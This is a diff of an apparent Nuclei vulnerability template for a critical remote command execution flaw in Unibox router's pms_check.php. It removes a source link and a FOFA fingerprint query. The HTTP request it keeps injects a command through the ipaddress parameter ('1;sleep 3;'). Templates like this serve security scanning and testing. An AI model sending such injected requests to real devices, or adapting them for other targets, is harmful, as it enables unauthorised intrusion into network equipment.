@@ -3,12 +3,8 @@ info:
   name: Unibox路由器 pms_check.php 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/agg9xvm2cx774iqu'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: agg9xvm2cx774iqu
-    fofa: body="Unibox" && body="Controller" || body="www.wifi-soft.com"
 http:
 - raw:
   - 'GET /billing/pms_check.php?ipaddress=1;sleep%203; HTTP/1.1
